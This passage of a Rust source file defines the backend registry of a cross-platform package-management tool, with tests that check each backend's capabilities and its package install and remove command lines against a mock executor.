// src/backends/registry.rs

use crate::app::LuaHooks;
use crate::backends::generic::RepoListing;
use crate::backends::generic::{
    GenericBackendCore, GenericInstallable, GenericQueryable, GenericSearchable, GenericUpgradable,
    ManagerConfig, ManualListing, SearchSource,
};
use crate::config::Config;
use crate::core::{BackendCapabilities, CommandExecutor};
use std::collections::BTreeMap;
use std::sync::Arc;
use tracing::trace;

/// The registrations, grouped by what the managers have in common rather than by how many
/// lines each takes. This file was 4,237 lines of which 1,800 were `fn register_*` bodies in
/// declaration order, so "where does apt live" and "what else is like apt" had the same answer:
/// scroll.
mod language;
mod os_native;
mod system;

use language::*;
use os_native::*;
use system::*;

/// **Ordered, because everything downstream walks it and calls the result an order.**
///
/// This was a `HashMap`, whose iteration order Rust randomises per process — so `available()`
/// and `all()` handed back the backends in a different sequence on every run. Two `shall list`
/// runs a second apart differed by 530 lines and sorted to the same file; `check health` moved
/// its rows; the fan-outs handed their first slots to whichever managers the seed picked, so no
/// timing measurement was reproducible; and any code that takes the *first* backend that can
/// answer was tossing a coin. A map keyed by a name people read is a map that should come out
/// in an order people can predict.
pub struct BackendRegistry {
    backends: BTreeMap<String, Arc<BackendCapabilities>>,
}

impl Default for BackendRegistry {
    fn default() -> Self {
        Self::new()
    }
}

impl BackendRegistry {
    pub fn new() -> Self {
        Self {
            backends: BTreeMap::new(),
        }
    }

    pub fn register(&mut self, backend: Arc<BackendCapabilities>) {
        let name = backend.name().to_string();
        trace!("Registry: Cataloging backend '{}'", name);
        self.backends.insert(name, backend);
    }

    pub fn get(&self, name: &str) -> Option<Arc<BackendCapabilities>> {
        self.backends.get(name).cloned()
    }

    /// Whether this host can actually run anything through that manager (II.7c).
    ///
    /// **The two ways to answer no are one answer to the user.** A name this build never
    /// registered — `apt` on Windows, `winget` on Linux — and a name registered here whose
    /// program is not installed are different facts about the registry and the same fact about
    /// the machine: there is nothing to install through, and nothing installed to remove.
    /// Written once so no call site can handle one and forget the other, which is how
    /// `spec_is_missing` came to raise `BackendNotFound` for the first and plan an install that
    /// could not run for the second.
    ///
    /// This does **not** answer "is that a real backend name" — a typo is caught in the
    /// grammar, against `Vocab`, before anything gets here.
    pub fn runs_here(&self, name: &str) -> bool {
        self.get(name).is_some_and(|b| b.is_available())
    }

    /// Whether an exact `@version=` can be turned into an install argument here (`Q53`).
    ///
    /// **A backend that cannot install at all cannot replay a version either**, so a name with
    /// no `Installable` answers no — the same shape as `runs_here`, where the two ways to answer
    /// no are one answer to the user.
    pub fn pins_version(&self, name: &str) -> bool {
        self.get(name)
            .and_then(|b| b.as_installable().map(|i| i.pins_version()))
            .unwrap_or(false)
    }

    /// Every registered backend whose program is installed here.
    ///
    /// **Named for the question it answers, because it used to be called `available()` and was
    /// used for a different one.** "Which backends are on this machine" and "which backends may
    /// Shall use" are not the same question — `priority` decides the second — and one method
    /// answering both is how the priority file came to gate resolution and nothing else. The
    /// second question lives on [`crate::app::Backends`], which filters by name *before*
    /// probing; this one probes everything by construction, so a caller reaching for it is
    /// asserting that the machine, and not the config, is its subject.
    pub fn present_on_this_machine(&self) -> Vec<Arc<BackendCapabilities>> {
        self.backends
            .values()
            .filter(|b| b.is_available())
            .cloned()
            .collect()
    }

    /// Every backend this build knows about, installed or not.
    ///
    /// `check health`'s subject: a manager that is absent is a report, and a manager that is
    /// absent *and named by `priority`* is a failure — a distinction only visible from here.
    pub fn all(&self) -> Vec<Arc<BackendCapabilities>> {
        self.backends.values().cloned().collect()
    }
}

/// Build the default backend registry.
///
/// This is a thin orchestrator: each specialized backend owns its own
/// `register(reg, exec, cfg)` in its module, and the generic (CLI-config-driven)
/// backends are registered by the small `register_*` helpers below. Adding a backend
/// is a localized change — write its `register` and add one call here.
pub async fn create_default_registry(
    executor: CommandExecutor,
    config: &Config,
    _hooks: Arc<LuaHooks>,
) -> BackendRegistry {
    let mut reg = BackendRegistry::new();

    // --- Linux native system managers ---
    if cfg!(target_os = "linux") {
        register_apt(&mut reg, &executor);
        register_apk(&mut reg, &executor);
        register_zypper(&mut reg, &executor);
        register_pacman(&mut reg, &executor);
        register_dnf(&mut reg, &executor);
        register_xbps(&mut reg, &executor);
        // AUR helpers: pacman-syntax drop-ins for Arch's user repository. Registered as
        // distinct backends (not a pacman flag) so `yay:pkg` / `paru:pkg` are explicit and
        // tracked separately. Runtime-gated by the helper binary being present.
        register_yay(&mut reg, &executor);
        register_paru(&mut reg, &executor);
    }

    // --- Windows native system managers ---
    if cfg!(target_os = "windows") {
        register_winget(&mut reg, &executor);
        register_scoop(&mut reg, &executor);
        register_choco(&mut reg, &executor);
    }

    // --- macOS native system managers ---
    if cfg!(target_os = "macos") {
        register_mas(&mut reg, &executor);
        register_macports(&mut reg, &executor);
    }

    // --- Everything that is a row in `builtin_backends.toml` ---
    //
    // Registered FIRST so a hand-written registration below is the one that survives a
    // collision, and `no_backend_is_both_a_row_and_a_registrar` in the suite fails when there
    // is one — a name in both places would otherwise be decided by the order of two calls.
    crate::backends::onboarder::register_builtin_backends(&mut reg, &executor);

    // --- Cross-platform & specialized backends (each module owns its registration) ---
    crate::backends::brew::register(&mut reg, &executor, config);
    crate::backends::mise::register(&mut reg, &executor, config);
    crate::backends::github::register(&mut reg, &executor, config);
    crate::backends::web::register(&mut reg, &executor, config);
    crate::backends::btrfs::register(&mut reg, &executor, config);
    crate::backends::storage::register(&mut reg, &executor, config);
    crate::backends::link::register(&mut reg, &executor, config);
    crate::backends::nix::register(&mut reg, &executor, config);
    crate::backends::vscode::register(&mut reg, &executor, config);
    crate::backends::emacs::register(&mut reg, &executor, config);
    crate::backends::service::register(&mut reg, &executor, config);
    crate::backends::setting::register(&mut reg, &executor, config);
    crate::backends::appimage::register(&mut reg, &executor, config);
    crate::backends::snap::register(&mut reg, &executor, config);
    crate::backends::flatpak::register(&mut reg, &executor, config);
    register_conda(&mut reg, &executor, config);
    if cfg!(target_os = "windows") {
        crate::backends::psresource::register(&mut reg, &executor, config);
    }

    // --- Language package managers (generic, config-driven) ---
    register_pip(&mut reg, &executor);
    register_gem(&mut reg, &executor);
    register_bun(&mut reg, &executor);
    register_pkgin(&mut reg, &executor);
    register_pkg_freebsd(&mut reg, &executor);
    register_pkg_add_openbsd(&mut reg, &executor);
    register_dotnet(&mut reg, &executor);

    // --- Ecosystem backends implemented as dedicated modules (subcommand binary / fs) ---
    crate::backends::go::register(&mut reg, &executor, config);

    // --- User-defined backends (the onboarder). Loaded last so a custom definition
    // can never silently shadow a built-in; collisions are skipped with a warning. ---
    crate::backends::onboarder::load_default_custom_backends(&mut reg, &executor, config);

    reg
}

// ============================================================================
// Ecosystem backends (added in the backend-expansion work)
//
// These all fit the generic CLI-config model. To cut the 20-field `ManagerConfig`
// boilerplate, `base_config` fills in inert defaults and each `register_*` overrides only
// the fields it needs; `register_generic` attaches the requested capability set.
// ============================================================================

/// A `ManagerConfig` with everything defaulted to "off"; callers set the fields they use.
fn base_config(name: &str) -> ManagerConfig {
    ManagerConfig {
        name: name.into(),
        binary: None,
        remove_binary: None,
        install_args: vec![],
        remove_args: vec![],
        purge_args: None,
        list_args: vec![],
        // Default to the safe answer, not the convenient one: an unlabelled backend is one
        // nobody has confirmed can separate user-chosen packages from dependencies, so
        // `adopt` adopts nothing from it. A backend whose installed set really is all
        // user-chosen says so with `ManualListing::AllInstalled`.
        manual: ManualListing::Unsupported,
        essential_args: None,
        search_args: vec![],
        search_binary: None,
        enumerate_args: None,
        enumerate_binary: None,
        list_binary: None,
        upgrade_args: vec![],
        update_args: None,
        orphan_dry_run: None,
        repo_add_args: None,
        repo_remove_args: None,
        repo_list_args: None,
        repo_binary: None,
        repo_list_binary: None,
        repo_remove_binary: None,
        repo_list_shape: RepoListing::Columns,
        depends: None,
        clean_cache: None,
        version_pin: None,
        needs_root: false,
        is_exclusive: false,
        install_source_option: None,
        extra_probes: None,
        upgrade_reinstall_args: None,
        property_probes: Vec::new(),
        machine_list: None,
        outdated: None,
        search_source: SearchSource::Command,
    }
}

/// Give a generic core its manager's exit policy.
///
/// Named rather than inlined so it can be asserted: an exit policy changes no argv, so a
/// backend that lost one looks identical from everywhere except a failing install.
fn with_manager_policy(core: Arc<GenericBackendCore>) -> Arc<GenericBackendCore> {
    Arc::new(GenericBackendCore {
        name: core.name.clone(),
        executor: core
            .executor
            .duplicate()
            .with_exit_policy(crate::core::exit_policy::for_manager(&core.name)),
        config: core.config.clone(),
        parser: core.parser.clone(),
    })
}

/// Register a generic backend, attaching Installable + MetadataProvider always and the
/// other capabilities per the boolean flags. Installable is always present (install is the
/// point); `query`/`search`/`upgrade` are opt-in because not every manager supports them.
///
/// **Every generic backend gets its manager's exit policy here**, so no registrar can forget
/// it. Two did: converting `cargo` and `pipx` to data on 2026-08-04 dropped the
/// `with_exit_policy` line their hand-written modules had, and `cargo install
/// <no-such-crate>` stopped being classified `permanent` — which sends the sweep harness back
/// to retrying a crate that will never exist. The argv table could not catch it, because an
/// exit policy is not argv. An unknown manager yields the default policy, which classifies
/// nothing, so applying this to all of them is safe in the direction that keeps a declaration.
#[allow(clippy::fn_params_excessive_bools)]
fn register_generic(
    reg: &mut BackendRegistry,
    core: Arc<GenericBackendCore>,
    query: bool,
    search: bool,
    upgrade: bool,
) {
    let core = with_manager_policy(core);
    let mut builder = BackendCapabilities::builder(core.clone())
        .with_installable(Arc::new(GenericInstallable { core: core.clone() }))
        .with_metadata_provider(core.clone());
    if query {
        builder = builder.with_queryable(Arc::new(GenericQueryable { core: core.clone() }));
    }
    if search {
        builder = builder.with_searchable(Arc::new(GenericSearchable { core: core.clone() }));
    }
    if upgrade {
        builder = builder.with_upgradable(Arc::new(GenericUpgradable { core: core.clone() }));
    }
    reg.register(Arc::new(builder.build()));
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::app::LuaHooks;
    use crate::parsers::LambdaParser;

    /// **A row reached by name, where a registrar was reached by symbol.**
    ///
    /// These tests drive one backend's argv at a time and took a
    /// `fn(&mut BackendRegistry, &CommandExecutor)`. The backends below are rows in
    /// `builtin_backends.toml` now, so the symbol they named is gone and the row is what
    /// stands in — same registration path, same capabilities, reached by the name the row
    /// carries. Every argv assertion below is unchanged, which is the point of doing it this
    /// way rather than deleting the assertions with the functions.
    macro_rules! rows_as_registrars {
        ($($fn_name:ident => $row:literal),* $(,)?) => {
            $(
                fn $fn_name(reg: &mut BackendRegistry, exec: &CommandExecutor) {
                    crate::backends::onboarder::register_builtin_row(reg, exec, $row);
                }
            )*
        };
    }

    rows_as_registrars! {
        register_asdf => "asdf",
        register_cabal => "cabal",
        register_cargo => "cargo",
        register_composer => "composer",
        register_emerge => "emerge",
        register_eopkg => "eopkg",
        register_guix => "guix",
        register_helm => "helm",
        register_krew => "krew",
        register_luarocks => "luarocks",
        register_mix => "mix",
        register_nimble => "nimble",
        register_npm => "npm",
        register_opam => "opam",
        register_pipx => "pipx",
        register_pixi => "pixi",
        register_pnpm => "pnpm",
        register_pubdart => "pub",
        register_slackpkg => "slackpkg",
        register_spack => "spack",
        register_stack => "stack",
        register_uv => "uv",
        register_yarn => "yarn",
    }

    async fn build_registry() -> BackendRegistry {
        let exec = CommandExecutor::new(true, false);
        let config = Config::default();
        let hooks = Arc::new(LuaHooks::new(&config).expect("hooks init"));
        create_default_registry(exec, &config, hooks).await
    }

    /// The set of capability labels a backend currently advertises.
    fn caps(b: &BackendCapabilities) -> Vec<&'static str> {
        let mut v = Vec::new();
        if b.as_installable().is_some() {
            v.push("installable");
        }
        if b.as_queryable().is_some() {
            v.push("queryable");
        }
        if b.as_searchable().is_some() {
            v.push("searchable");
        }
        if b.as_upgradable().is_some() {
            v.push("upgradable");
        }
        if b.as_repo_manager().is_some() {
            v.push("repo_manager");
        }
        if b.as_metadata_provider().is_some() {
            v.push("metadata_provider");
        }
        v
    }

    /// Assert a backend is registered with EXACTLY the expected capability set.
    /// Exact-match catches both a dropped `.with_*` (e.g. after a refactor) and an
    /// accidental extra capability.
    fn assert_caps(reg: &BackendRegistry, name: &str, expected: &[&str]) {
        let b = reg
            .get(name)
            .unwrap_or_else(|| panic!("backend '{}' is not registered", name));
        let got = caps(&b);
        for cap in expected {
            assert!(
                got.contains(cap),
                "backend '{}' is missing capability '{}' (has {:?})",
                name,
                cap,
                got
            );
        }
        assert_eq!(
            got.len(),
            expected.len(),
            "backend '{}' capability set mismatch: got {:?}, expected {:?}",
            name,
            got,
            expected
        );
    }

    /// Which backends a bare `shall adopt` declines to take, and why it is a short list.
    ///
    /// Opting out is a real cost to the user — a backend that keeps itself out of `adopt` is a
    /// backend they have to write by hand — so it is spelled out here rather than left to
    /// whoever adds the next one. The bar is not "this list is noisy": it is *being on the
    /// machine is not evidence anybody chose it*, which is true of an init's running services
    /// and of nothing else Shall drives.
    ///
    /// Measured before the ruling: `adopt` wrote 161 declarations on a Windows host and 150
    /// were services (owner ruling, 2026-08-05 — `Q39`).
    #[tokio::test]
    async fn only_the_backends_that_cannot_know_your_intent_opt_out_of_adopt() {
        let reg = build_registry().await;
        let available = reg.present_on_this_machine();
        let mut opted_out: Vec<&str> = available
            .iter()
            .filter(|b| b.as_queryable().is_some_and(|q| !q.adopted_unasked()))
            .map(|b| b.name())
            .collect();
        opted_out.sort();
        assert_eq!(
            opted_out,
            vec!["service"],
            "a backend joined or left the set `adopt` does not take unasked. Joining it means              users must write those lines by hand, so it needs the same argument `service`              has: an init reports what is running and never who chose it."
        );
    }

    // Regression guard for the per-backend register() refactor: every backend must
    // register with its intended capability set. Cross-platform backends are asserted
    // everywhere; OS-native ones under their cfg (so Linux apt/dnf/pacman are checked
    // when this runs on Linux).
    #[tokio::test]
    async fn registry_capability_matrix() {
        let reg = build_registry().await;

        const FULL: &[&str] = &[
            "installable",
            "queryable",
            "searchable",
            "upgradable",
            "metadata_provider",
        ];

        // Cross-platform specialized backends
        assert_caps(&reg, "brew", FULL);
        assert_caps(&reg, "cargo", FULL);
        assert_caps(
            &reg,
            "pipx",
            &[
                "installable",
                "queryable",
                "upgradable",
                "metadata_provider",
            ],
        );
        assert_caps(
            &reg,
            "uv",
            &[
                "installable",
                "queryable",
                "upgradable",
                "metadata_provider",
            ],
        );
        assert_caps(&reg, "npm", FULL);
        assert_caps(&reg, "pnpm", FULL);
        assert_caps(&reg, "yarn", FULL);
        assert_caps(&reg, "mise", FULL);
        assert_caps(
            &reg,
            "github",
            &["installable", "queryable", "metadata_provider"],
        );
        assert_caps(
            &reg,
            "web",
            &["installable", "queryable", "metadata_provider"],
        );
        assert_caps(
            &reg,
            "btrfs",
            &["installable", "queryable", "metadata_provider"],
        );
        assert_caps(&reg, "link", &["installable", "metadata_provider"]);
        assert_caps(&reg, "nix", FULL);
        assert_caps(&reg, "vscode", FULL);
        assert_caps(&reg, "emacs", FULL);
        assert_caps(
            &reg,
            "service",
            &["installable", "queryable", "metadata_provider"],
        );
        assert_caps(
            &reg,
            "appimage",
            &["installable", "queryable", "metadata_provider"],
        );
        assert_caps(&reg, "snap", FULL);
        assert_caps(&reg, "flatpak", FULL);
        assert_caps(&reg, "conda", FULL);

        // Cross-platform generic managers (gated at runtime by their binary)
        assert_caps(&reg, "pkgin", FULL);
        // U26: the BSD package tools. Registered on every platform (runtime-gated by binary
        // presence), so they are asserted unconditionally like pkgin.
        assert_caps(&reg, "pkg", FULL);
        assert_caps(&reg, "pkg_add", FULL);
        assert_caps(&reg, "dotnet", FULL);

        // Language managers (generic)
        assert_caps(
            &reg,
            "pip",
            &[
                "installable",
                "queryable",
                "searchable",
                "metadata_provider",
            ],
        );
        // `gem update` upgrades every installed gem, which is exactly the verb `Upgradable`
        // is for; it was the third manager whose config said so and whose builder did not.
        assert_caps(
            &reg,
            "gem",
            &[
                "installable",
                "queryable",
                "searchable",
                "upgradable",
                "repo_manager",
                "metadata_provider",
            ],
        );
        // **`bun` is deliberately none of the three.** `bun upgrade` upgrades the bun runtime,
        // not the packages bun installed, and its `search_fn` returns nothing — so registering
        // either capability would turn "not supported" into "did the wrong thing" and "no
        // results". Recorded in this file's EXEMPT sibling,
        // `a_configured_capability_is_a_registered_one_tests`.
        assert_caps(
            &reg,
            "bun",
            &["installable", "queryable", "metadata_provider"],
        );

        // Ecosystem backends added in the backend-expansion work.
        const IQ: &[&str] = &["installable", "queryable", "metadata_provider"];
        const IQS: &[&str] = &[
            "installable",
            "queryable",
            "searchable",
            "metadata_provider",
        ];
        assert_caps(&reg, "composer", FULL);
        assert_caps(&reg, "opam", FULL);
        assert_caps(&reg, "pixi", FULL);
        assert_caps(&reg, "luarocks", IQS);
        assert_caps(&reg, "spack", IQS);
        assert_caps(&reg, "cabal", IQS);
        assert_caps(&reg, "nimble", IQ);
        assert_caps(&reg, "mix", IQ);
        assert_caps(&reg, "helm", IQ);
        assert_caps(&reg, "asdf", IQ);
        // stack has no uninstall/list/search: install + metadata only.
        assert_caps(&reg, "stack", &["installable", "metadata_provider"]);
        // Dedicated modules.
        assert_caps(
            &reg,
            "go",
            &[
                "installable",
                "queryable",
                "upgradable",
                "metadata_provider",
            ],
        );
        assert_caps(
            &reg,
            "pub",
            &[
                "installable",
                "queryable",
                "upgradable",
                "metadata_provider",
            ],
        );
        assert_caps(&reg, "krew", FULL);

        #[cfg(target_os = "linux")]
        {
            // Linux-distro ecosystem backends.
            assert_caps(&reg, "guix", FULL);
            assert_caps(&reg, "emerge", FULL);
            assert_caps(&reg, "eopkg", FULL);
            assert_caps(&reg, "slackpkg", FULL);

            const SYS: &[&str] = &[
                "installable",
                "queryable",
                "searchable",
                "upgradable",
                "repo_manager",
                "metadata_provider",
            ];
            assert_caps(&reg, "apt", SYS);
            assert_caps(&reg, "apk", SYS);
            assert_caps(&reg, "zypper", SYS);
            assert_caps(&reg, "pacman", SYS);
            assert_caps(&reg, "dnf", SYS);
            // XBPS (Void) and the AUR helpers advertise the full read/write/search set
            // but no repo manager.
            assert_caps(&reg, "xbps", FULL);
            assert_caps(&reg, "yay", FULL);
            assert_caps(&reg, "paru", FULL);
        }
        #[cfg(target_os = "windows")]
        {
            // `winget upgrade --all` and `scoop update *` are real verbs, and both managers
            // already carried an `OutdatedProbe` to find out what needed them. They were the
            // only two of the three Windows managers not registered `Upgradable`, and this
            // matrix pinned the omission as correct — which is what a matrix written from the
            // code always does. `a_configured_capability_is_a_registered_one_tests` asks the
            // other question.
            //
            // All three Windows managers have sources, so all three are `SYS`-shaped.
            const WIN: &[&str] = &[
                "installable",
                "queryable",
                "searchable",
                "upgradable",
                "repo_manager",
                "metadata_provider",
            ];
            assert_caps(&reg, "winget", WIN);
            assert_caps(&reg, "scoop", WIN);
            assert_caps(&reg, "choco", WIN);
            assert_caps(&reg, "psresource", FULL);
        }
        #[cfg(target_os = "macos")]
        {
            assert_caps(
                &reg,
                "mas",
                &[
                    "installable",
                    "queryable",
                    "searchable",
                    "upgradable",
                    "metadata_provider",
                ],
            );
            assert_caps(&reg, "macports", FULL);
        }
    }

    /// Every OS-native backend's install and remove argv, checked on whatever host runs the
    /// suite.
    ///
    /// These registrars were `#[cfg(target_os = …)]` until 2026-07-26, so `mas`'s verbs were
    /// only ever compiled on a Mac and `apt`'s only on Linux — a typo in either was invisible
    /// to every other platform's CI, and there is no Mac in this project at all. They are
    /// compiled everywhere now and still *registered* only on their own OS, which is the part
    /// that has to stay true: `create_default_registry` keeps its `cfg!` gate, and
    /// `registry_capability_matrix` asserts what this host actually offers.
    /// A system package manager resolves its own dependency closure, so Shall must not
    /// re-derive one: `expand_transitive_dependencies` turns every returned name into an
    /// install node, and a name that is not a package is then installed by name.
    ///
    /// `zypper` was the only system manager that asked, and it is the one whose first real run
    /// could not install anything — `zypper info --requires jq` answered with `Loading`,
    /// `Reading`, `No` and twenty other words it had printed, and three of them required each
    /// other in a cycle. This asserts the whole family agrees, not just the one that broke.
    #[tokio::test]
    async fn no_self_resolving_system_manager_re_derives_a_dependency_closure() {
        type Registrar = fn(&mut BackendRegistry, &CommandExecutor);
        let system: &[(&str, Registrar)] = &[
            ("apt", register_apt),
            ("apk", register_apk),
            ("zypper", register_zypper),
            ("winget", register_winget),
            ("scoop", register_scoop),
            ("choco", register_choco),
            ("guix", register_guix),
            ("emerge", register_emerge),
            ("eopkg", register_eopkg),
            ("slackpkg", register_slackpkg),
            ("pkgin", register_pkgin),
            ("pkg", register_pkg_freebsd),
            ("pkg_add", register_pkg_add_openbsd),
            ("yay", register_yay),
            ("paru", register_paru),
        ];

        let mut asks: Vec<String> = Vec::new();
        for (name, register) in system {
            let vfs = Arc::new(dashmap::DashMap::new());
            let mock_calls = Arc::new(crate::core::executor::MockExecutor::new(vfs.clone()));
            let exec = CommandExecutor::with_layer(
                true,
                false,
                mock_calls.clone(),
                vfs,
                Arc::new(dashmap::DashMap::new()),
            );
            let mut reg = BackendRegistry::new();
            register(&mut reg, &exec);
            let b = reg
                .get(name)
                .unwrap_or_else(|| panic!("{} did not register", name));
            let Some(mp) = b.as_metadata_provider() else {
                continue;
            };
            let _ = mp.get_dependencies("jq").await;
            // The assertion is that it RAN NOTHING. Checking the returned `Vec` instead would
            // pass on every manager whether or not it asked, because an unmocked command
            // answers with nothing — the vacuous check this repo keeps rediscovering.
            let ran = mock_calls.get_calls().await;
            if !ran.is_empty() {
                asks.push(format!("{name} ran {ran:?}"));
            }
        }
        assert!(
            asks.is_empty(),
            "these system managers re-derive a dependency closure their own installer already \
             resolves, and every name they return becomes an install node: {asks:?}"
        );
    }

    /// What a verb must do, when driven against a mock that runs nothing.
    ///
    /// Three outcomes and no fourth, because the fourth — "it did something, we did not look" —
    /// is how `pixi global upgrade-all` survived upstream removal inside a passing suite.
    #[derive(Debug)]
    enum Expect {
        /// A call containing this substring must have run.
        Runs(&'static str),
        /// The verb must refuse with `Unsupported` and run **nothing**. Asserted rather than
        /// skipped: a manager with no uninstall verb that silently ran *something* would leave
        /// the model claiming a package is gone that is still installed.
        Unsupported,
        /// This verb runs no command at all, and the reason. A download backend fetches over
        /// HTTP and a link backend writes a symlink; neither shells out, so "no argv" is the
        /// correct answer rather than a gap. The reason is the exemption — an unexplained one
        /// is a backend nobody looked at wearing the costume of one somebody did (E29).
        NoCommand(&'static str),
    }

    /// Every registrar this build compiles, the declaration to drive it with, and the argv it
    /// must produce.
    ///
    /// **One table for both halves of the family.** Until 2026-08-04 this covered only the
    /// registrars written *in this file*, because that is where the check was written and the
    /// scan that guards it read one file. The twenty-eight backends that register from their
    /// own modules — `brew`, `npm`, `nix`, `snap`, `pacman`, every one of them — had no argv
    /// row and no exemption, which is this repo's signature defect (`CLAUDE.md`: a rule found
    /// once and applied to the half of the family that happened to be in the file being
    /// edited). `tests/os_native_argv_coverage_tests.rs` now scans both halves.
    struct ArgvCase {
        backend: &'static str,
        /// A closure, not a function pointer: the registrars in this file take
        /// `(reg, exec)` and every module-owned one also takes a `&Config`. A row that is a
        /// closure adapts in place, so adding a backend does not also add a wrapper function
        /// nobody reads — `register_psresource_for_test` was the first of twenty-eight.
        register: &'static dyn Fn(&mut BackendRegistry, &CommandExecutor),
        /// What the declaration names. `jq` for a package manager — but `setting:` addresses
        /// `SUBKEY/VALUE` and `lvm:` addresses `group/volume`, and a package name is neither.
        /// Driving every backend with `"jq"` would have tested those backends' *refusals* and
        /// reported it as argv coverage.
        subject: &'static str,
        options: &'static [(&'static str, &'static str)],
        install: Expect,
        remove: Expect,
    }

    impl ArgvCase {
        /// A package manager: the declaration is a bare package name.
        fn pkg(
            backend: &'static str,
            register: &'static dyn Fn(&mut BackendRegistry, &CommandExecutor),
            install: Expect,
            remove: Expect,
        ) -> Self {
            Self {
                backend,
                register,
                subject: "jq",
                options: &[],
                install,
                remove,
            }
        }

        /// A backend whose declaration is not a package name.
        fn shaped(
            backend: &'static str,
            register: &'static dyn Fn(&mut BackendRegistry, &CommandExecutor),
            subject: &'static str,
            options: &'static [(&'static str, &'static str)],
            install: Expect,
            remove: Expect,
        ) -> Self {
            Self {
                backend,
                register,
                subject,
                options,
                install,
                remove,
            }
        }
    }

    /// The argv table. Kept in one function so the scan has one region to read.
    fn argv_cases() -> Vec<ArgvCase> {
        use Expect::{NoCommand, Runs, Unsupported};
        vec![
            // ---- OS-native system managers, each invisible to every platform's CI but its own.
            ArgvCase::pkg(
                "apt",
                &register_apt,
                Runs("apt install -y -- jq"),
                Runs("apt remove -y -- jq"),
            ),
            ArgvCase::pkg(
                "apk",
                &register_apk,
                Runs("apk add -- jq"),
                Runs("apk del -- jq"),
            ),
            ArgvCase::pkg(
                "zypper",
                &register_zypper,
                Runs("zypper install -y"),
                Runs("zypper remove -y"),
            ),
            ArgvCase::pkg(
                "winget",
                &register_winget,
                Runs("winget install"),
                Runs("winget uninstall"),
            ),
            ArgvCase::pkg(
                "scoop",
                &register_scoop,
                Runs("scoop install"),
                Runs("scoop uninstall"),
            ),
            ArgvCase::pkg(
                "choco",
                &register_choco,
                Runs("choco install"),
                Runs("choco uninstall"),
            ),
            ArgvCase::pkg(
                "mas",
                &register_mas,
                Runs("mas install"),
                Runs("mas uninstall"),
            ),
            ArgvCase::pkg(
                "macports",
                &register_macports,
                Runs("port install"),
                Runs("port uninstall"),
            ),
            // PowerShell's module manager. Its module was `#[cfg(target_os = "windows")]` until
            // 2026-07-30, so it could not appear in this table at all: the row would not compile
            // where it is most needed, which is every platform that cannot run PSResourceGet.
            ArgvCase::pkg(
                "psresource",
                &|r, e| crate::backends::psresource::register(r, e, &Config::default()),
                Runs("Install-PSResource"),
                Runs("Uninstall-PSResource"),
            ),
            // The two rows that carried the defect as their expectation. `--` is not decoration
            // here: these are the two managers that run as root.
            ArgvCase::pkg(
                "pacman",
                &register_pacman,
                Runs("pacman -S --noconfirm --needed -- jq"),
                Runs("pacman -Rs --noconfirm -- jq"),
            ),
            // No terminator, and that is the fix rather than the omission: `dnf` is dnf5 on
            // Fedora 41+, whose parser answers `Unknown argument "--"`. This expectation
            // demanded the broken form and was green the whole time the installs were failing.
            ArgvCase::pkg(
                "dnf",
                &register_dnf,
                Runs("dnf install -y jq"),
                Runs("dnf remove -y jq"),
            ),
            // Void's manager installs and removes with two different programs, which is the
            // `remove_binary` case a single-binary assumption gets wrong.
            ArgvCase::pkg(
                "xbps",
                &register_xbps,
                Runs("xbps-install -Sy -- jq"),
                Runs("xbps-remove -y -- jq"),
            ),
            ArgvCase::pkg(
                "guix",
                &register_guix,
                Runs("guix install"),
                Runs("guix remove"),
            ),
            ArgvCase::pkg(
                "emerge",
                &register_emerge,
                Runs("emerge"),
                Runs("--unmerge"),
            ),
            ArgvCase::pkg(
                "eopkg",
                &register_eopkg,
                Runs("eopkg install -y"),
                Runs("eopkg remove -y"),
            ),
            ArgvCase::pkg(
                "slackpkg",
                &register_slackpkg,
                Runs("slackpkg -batch=on"),
                Runs("remove"),
            ),
            // The AUR helpers: pacman-syntax, registered on Linux only, and until 2026-07-30
            // reached through a five-argument helper no row could name.
            ArgvCase::pkg("yay", &register_yay, Runs("yay -S"), Runs("yay -Rs")),
            ArgvCase::pkg("paru", &register_paru, Runs("paru -S"), Runs("paru -Rs")),
            // The BSD tools, where removal is a different program.
            ArgvCase::pkg(
                "pkgin",
                &register_pkgin,
                Runs("pkgin -y install"),
                Runs("pkgin -y remove"),
            ),
            ArgvCase::pkg(
                "pkg",
                &register_pkg_freebsd,
                Runs("pkg install -y"),
                Runs("pkg delete -y"),
            ),
            ArgvCase::pkg(
                "pkg_add",
                &register_pkg_add_openbsd,
                Runs("pkg_add"),
                Runs("pkg_delete"),
            ),
            // ---- Cross-platform store-shaped managers.
            ArgvCase::pkg(
                "brew",
                &|r, e| crate::backends::brew::register(r, e, &Config::default()),
                Runs("brew install -- jq"),
                Runs("brew uninstall -- jq"),
            ),
            // `snap info` first: the install path asks whether the snap is classic before it
            // installs, so both calls are the argv and asserting only the second would let the
            // probe change without notice.
            ArgvCase::pkg(
                "snap",
                &|r, e| crate::backends::snap::register(r, e, &Config::default()),
                Runs("snap install -- jq"),
                Runs("snap remove -- jq"),
            ),
            ArgvCase::pkg(
                "flatpak",
                &|r, e| crate::backends::flatpak::register(r, e, &Config::default()),
                // `--or-update` because flatpak calls an already-installed ref an error and
                // exits non-zero (`Y23`).
                Runs("flatpak install --system -y --noninteractive --or-update -- jq"),
                Runs("flatpak uninstall --system -y --noninteractive -- jq"),
            ),
            ArgvCase::pkg(
                "nix",
                &|r, e| crate::backends::nix::register(r, e, &Config::default()),
                Runs("nix profile install -- nixpkgs#jq"),
                // nix removes by index, so it must read the profile before it can name what to
                // remove. The listing IS the removal's first argv; a row asserting a
                // `nix profile remove` that never runs would pin a command that does not exist.
                Runs("nix profile list --json"),
            ),
            ArgvCase::pkg(
                "conda",
                &|r, e| register_conda(r, e, &Config::default()),
                Runs("conda install -n base -y -- jq"),
                Runs("conda remove -n base -y -- jq"),
            ),
            // ---- Language managers.
            ArgvCase::pkg(
                "pip",
                &register_pip,
                Runs("pip install"),
                Runs("pip uninstall"),
            ),
            ArgvCase::pkg(
                "gem",
                &register_gem,
                Runs("gem install"),
                Runs("gem uninstall"),
            ),
            ArgvCase::pkg("bun", &register_bun, Runs("bun add"), Runs("bun remove")),
            ArgvCase::pkg(
                "dotnet",
                &register_dotnet,
                Runs("dotnet tool install"),
                Runs("dotnet tool uninstall"),
            ),
            ArgvCase::pkg(
                "cargo",
                &register_cargo,
                Runs("cargo install -- jq"),
                Runs("cargo uninstall -- jq"),
            ),
            ArgvCase::pkg(
                "pipx",
                &register_pipx,
                Runs("pipx install -- jq"),
                Runs("pipx uninstall -- jq"),
            ),
            ArgvCase::pkg(
                "uv",
                &register_uv,
                Runs("uv tool install -- jq"),
                Runs("uv tool uninstall -- jq"),
            ),
            // The three Node managers spell the same two verbs three ways, which is exactly why
